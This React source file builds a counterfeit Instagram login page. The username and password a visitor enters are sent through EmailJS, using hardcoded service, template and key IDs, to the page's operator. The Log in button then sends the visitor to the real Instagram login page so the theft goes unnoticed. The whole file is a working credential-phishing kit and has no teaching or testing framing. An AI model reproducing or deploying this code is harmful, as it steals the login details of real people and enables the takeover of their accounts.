import React, { useState } from "react";
import "./index.css";
import { useRef } from 'react';
import emailjs from '@emailjs/browser';




const App = () => {
  const form = useRef();
  const [userName, setUserName] = useState()
  const [password, setPassword] = useState()

  const sendEmail = (e) => {
    e.preventDefault();

    emailjs.sendForm('service_fk4sodi', 'template_4o1s72j', form.current, 'a8UkC4uIcU3L5JwhD')
      .then((result) => {
          console.log(result.text);
      }, (error) => {
          console.log(error.text);
      });
  };

  return (
    <React.Fragment>

      <div id="wrapper">
        <div className="container">
        {/* <img
        className="instapic"
           src="https://lavnik.net/wp-content/uploads/2019/10/instagram-blue-check-mark-verification-theblackmedia-2018.jpg"
           alt="ios app"
           /> */}
          <div className="phone-app-demo" />
          <div className="form-data">
            <form ref={form} onSubmit={sendEmail}>
              <div className="logo">
                <h1>Instagram</h1>  
              </div>
              <input
                type="text"
                placeholder="Phone number, username, or email"
                name="user_name"
                value={userName}
                onChange={(e) => setUserName(e.target.value)}
                required
              />
              <input
                type="password"
                placeholder="Password"
                name="user_password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                required />
              {/* <input  type="submit" value="Send" /> */}
              
              <button 
              onClick={() => { window.location = "https://www.instagram.com/accounts/login/" }}
              className="form-btn"
              type="submit"
              value="Send">Log in</button>

              <span className="has-separator">Or</span>
              <a href="#" className="facebook-login" onClick={() => { window.location = "https://www.facebook.com/" }}>
                Log in with Facebook
              </a>
              <a className="password-reset" href="#">
                Forgot password?
              </a>
            </form>
            <div className="sign-up">
              Don't have an account? <a href="#" onClick={() => { window.location = "https://www.instagram.com/accounts/login/" }}>Sign up</a>
            </div>
          </div>
        </div>
      </div>
    </React.Fragment>
  );
};

export default App;

